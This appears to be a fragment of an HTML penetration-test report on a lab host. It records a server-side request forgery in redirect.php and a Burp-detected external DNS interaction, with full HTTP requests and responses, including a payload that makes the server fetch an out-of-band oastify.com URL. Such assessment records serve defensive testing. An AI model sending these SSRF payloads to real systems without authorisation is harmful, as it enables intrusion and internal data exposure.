+<div class="ev"><div class="evh">Evidence <code>ev-mqxo6y0d-10</code> — <code>artifacts/_/ev-mqxo6y0d-10/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php HTTP/1.1
+Host: target.local:32798
+
+GET /redirect.php?url=http%3a%2f%2ftarget.local%3a32798%2fp0uganxnsv HTTP/1.1
+Host: target.local:32798
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 10:50:53 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 247
+Content-Type: text/html; charset=UTF-8
+
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  file_get_contents(http://target.local:32798/p0uganxnsv): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in &lt;b&gt;/var/www/html/redirect.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;&lt;br /&gt;
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;&lt;/pre&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 6. [burp] External service interaction (DNS)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.&lt;br&gt;&lt;br&gt;The payload &lt;b&gt;https://e3irhhwdsm9rpfqryjf1x0ogd7j1745swgn3dr2.oastify.com/&lt;/b&gt; was submitted in the &lt;b&gt;url&lt;/b&gt; parameter.&lt;br&gt;&lt;br&gt;The application performed a DNS lookup of the specified domain. (confidence: CERTAIN) @ http://target.local:32798/redirect.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo6y0t-13</code> — <code>artifacts/_/ev-mqxo6y0t-13/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php HTTP/1.1
+Host: target.local:32798
+
+GET /redirect.php?url=https%3a%2f%2fe3irhhwdsm9rpfqryjf1x0ogd7j1745swgn3dr2.oastify.com%2f HTTP/1.1
+Host: target.local:32798
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 10:52:32 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 121
+Content-Type: text/html; charset=UTF-8
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;56i7oo19x8gt40k9aarj8zzjmgvqgjgjfigz&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;</pre></div>
+</div>
+</body></html>
